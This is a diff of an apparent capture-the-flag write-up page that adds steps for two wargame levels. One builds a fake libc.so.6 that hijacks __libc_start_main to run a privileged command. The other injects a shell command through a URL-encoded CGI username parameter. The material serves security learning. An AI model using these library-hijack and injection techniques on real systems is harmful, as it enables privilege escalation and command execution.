@@ -118,7 +118,7 @@
 
       <div class="read-time">
         <small>
-          6 minute read
+          7 minute read
         </small>
       </div>
 
@@ -459,6 +459,54 @@ if __name__=='__main__':
 ------------------
 </code></pre>
 </div>
+
+<h4 id="x15-level15">0x15 level15</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>    cd /home/flag15
+    strace ./flag15
+        found one line:open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) 
+    vi /var/tmp/flag15/exploit.c
+    ------------exploit.c-----------
+    #include &lt;unistd.h&gt;
+    int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+        execl("/bin/getflag", (char *)NULL, (char *)NULL);
+    }
+    --------------------------------
+    cd /var/tmp/flag15
+    gcc -g -fPIC -c exploit.c (-g===&gt;for gdb,-c===&gt;产生目标文件,不产生可执行文件)
+    ll
+        exploit.c
+        exploit.o
+    gcc exploit.o -shared -o libc.so.6
+    /home/flag15/flag15
+       relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc│[~] [~] [~]                                                                  
+       .so.6 with link time reference
+    vi verscript
+    ---verscript-----
+    GLIBC_2.0{
+    global:__libc_start_main;
+    local: *;
+    };
+    -----------------
+    gcc -shared -Wl,--version-script,verscript,-Bstatic -static-libgcc -o libc.so.6 exploit.o
+    /home/flag15/flag15
+</code></pre>
+</div>
+
+<h4 id="x16-level-16">0x16 level 16</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    vi /tmp/exp.sh
+    ----content-----
+    /bin/getflag&gt;&gt;/tmp/level16.out
+    ----------------
+    another terminal:
+        nv -lv 1616
+    origin terminal:
+        wget http://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&amp;password=
+            urldecode:   "&lt;/DEV/NULL;P=/TMP/EXP.SH;${P,,};#
+</code></pre>
+</div>
+
+<h4 id="x17-level-17">0x17 level 17</h4>
 </span>
 
         
